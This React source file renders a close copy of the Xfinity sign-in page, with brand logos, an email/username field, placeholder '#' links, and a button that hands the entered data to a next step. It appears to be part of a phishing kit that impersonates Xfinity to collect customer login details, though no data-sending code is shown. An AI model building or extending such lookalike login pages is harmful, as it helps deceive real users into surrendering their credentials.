import React, { useState } from 'react';
import Xfinity from '../assets/Xfinity.png';
import logo from '../assets/logo.png';
import bottom from '../assets/bottom.png';

const LoginPage = ({ formData, handleChange, handleNext }) => {
  const [loading, setLoading] = useState(false); // Add loading state

  const handleButtonClick = async () => {
    setLoading(true); // Set loading to true
    await handleNext(); // Call the next step
    setLoading(false); // Reset loading state
  };

  return (
    <div className="flex flex-col md:flex-row h-screen">
      {/* Left section */}
      <div className="flex flex-col bg-white w-full md:w-1/2 px-6 sm:px-10 md:px-32 py-10 sm:py-14 md:py-28">
        {/* Logo */}
        <img src={logo} alt="Xfinity" className="w-16 sm:w-20 md:w-24 mb-6" />

        {/* Sign-in form */}
        <h1 className="text-xl sm:text-2xl md:text-3xl font-bold mb-4">
          Sign in with your Xfinity ID
        </h1>
        <div className="flex flex-col">
          <input
            type="text"
            name="email"
            value={formData.email}
            onChange={handleChange}
            placeholder="Email, mobile, or username"
            aria-label="Email, mobile, or username" // Accessibility
            className="border border-gray-300 rounded-lg p-3 w-full mb-4 focus:outline-none focus:ring-2 focus:ring-purple-600"
          />
        </div>

        <p className="text-sm sm:text-base text-gray-500 mb-4">
          By signing in, you agree to our{' '}
          <a href="#" className="text-purple-600">
            Terms of Service
          </a>{' '}
          and{' '}
          <a href="#" className="text-purple-600">
            Privacy Policy
          </a>.
        </p>

        {/* Button with loader effect */}
        <button
          onClick={handleButtonClick}
          type="button"
          className="bg-[#5a23b9] text-white py-4 px-2 rounded-md hover:bg-[#411987] mb-4 w-full sm:w-28"
          disabled={loading} // Disable button while loading
        >
          {loading ? 'Loading...' : "Let's Go"} {/* Loader text */}
        </button>

        {/* Additional links */}
        <div className="flex flex-col gap-4 text-sm sm:text-base text-black py-8 sm:py-14">
          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer">
            <p className="md:px-2 text-[16px]">
              New to Xfinity?{' '}
              <a href="#" className="text-black">
                View exclusive offers near you
              </a>
            </p>
          </div>

          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer text-[16px] relative">
            <a href="#" className="text-black px-2">
              Find your Xfinity ID
            </a>
          </div>

          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer text-[16px] relative">
            <a href="#" className="text-black px-2">
              Create a new Xfinity ID
            </a>
          </div>
        </div>
      </div>

      {/* Right section */}
      <div className="text-white w-full md:w-1/2 flex flex-col justify-center items-center p-8 relative">
        <h2 className="text-2xl sm:text-3xl font-bold mb-4">Xfinity Mobile</h2>
        <p className="text-lg sm:text-xl mb-6">The ultimate mobile network</p>
        <p className="text-sm sm:text-base mb-6 max-w-md text-center">
          With up to gig-speed WiFi in millions of locations nationwide,
          only Xfinity Mobile gives you the ultimate connection.
        </p>
        <img
          src={Xfinity}
          alt="Xfinity Mobile Devices"
          className="h-40 md:h-screen absolute object-contain right-0 hidden md:block"
        />
        <img
          src={bottom}
          alt=""
          className="w-40 md:w-[629.5px] absolute bottom-0 object-contain right-0 hidden md:block"
        />
      </div>
    </div>
  );
};

export default LoginPage;
